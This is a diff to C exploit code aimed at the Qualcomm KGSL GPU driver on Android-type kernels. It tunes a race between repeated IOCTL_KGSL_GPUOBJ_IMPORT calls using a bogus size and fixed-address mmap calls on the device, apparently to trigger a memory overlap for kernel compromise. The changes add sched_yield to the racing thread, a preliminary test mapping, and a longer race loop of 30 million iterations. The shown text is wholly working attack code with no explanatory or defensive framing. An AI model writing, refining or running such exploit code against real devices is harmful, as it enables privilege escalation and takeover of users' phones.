@@ -22,6 +22,7 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/sysmacros.h>
+#include <sched.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -194,24 +195,44 @@ static void *race_thread(void *arg) {
         .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
     };
-    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+    while (!race_done) {
+        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+        sched_yield();
+    }
     return NULL;
 }
 
 static bool phase2_race(void) {
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+
+    // Test if the object can be mapped at all (non-fixed)
+    void *test = mmap(NULL, OVERLAP_SIZE, PROT_READ|PROT_WRITE,
+                      MAP_SHARED, kgsl_fd, (off_t)ov_id << 12);
+    if (test == MAP_FAILED) {
+        perror("test mmap failed");
+        return false;
+    }
+    munmap(test, OVERLAP_SIZE);
+
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
     int hit = 0;
-    for (int i = 0; i < 20000000; i++) {
+    for (int i = 0; i < 30000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
             kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 1000000 == 0) printf("  race %d/20000000 errno=%d\n", i, e);
+        if (r != MAP_FAILED) {
+            munmap(r, OVERLAP_SIZE);
+            hit = 1;
+            break;
+        }
+        if (e == ENODEV) {
+            hit = 1;
+            break;
+        }
+        if (i % 1000000 == 0) printf("  race %d/30000000 errno=%d\n", i, e);
     }
 
     race_done = 1;
